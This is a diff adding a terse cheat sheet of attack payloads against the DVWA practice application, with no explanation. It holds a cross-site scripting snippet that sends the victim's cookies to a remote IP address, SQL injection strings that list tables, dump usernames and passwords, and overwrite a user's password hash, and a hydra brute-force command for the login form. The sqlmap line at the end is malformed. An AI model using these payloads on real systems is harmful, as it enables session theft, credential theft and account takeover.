@@ -1,0 +1,23 @@
+<script>
+document.write('
+<a href="http://193.95.69.53:8000/' + document.cookie +" ' >comment</a>
+');
+</script>
+
+<meta http-equiv="refresh" content="0" url='http://google.com'> 
+
+1' union select TABLE_NAME,1 from information_schema.tables where table_schema='dvwa' -- '
+
+1' union select column_name,column_type from information_schema.columns where table_name='users' and table_schema='dvwa' --'
+
+1' ; update dvwa.users set password='5f4dcc3b5aa765d61d8327deb882cf99' where user='gordonb' -- '
+
+1' union select concat(user_id,':',first_name,':',last_name),concat(user,':',password) from users -- '
+
+hydra 193.95.69.14  http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=^submit^:Login failed" -L usernames.txt -P passwords.txt 
+
+https://www.exploit-db.com/
+
+https://gchq.github.io/CyberChef/
+
+sqlmap -u "http://..." -dbs -tables -D -T --dumbs
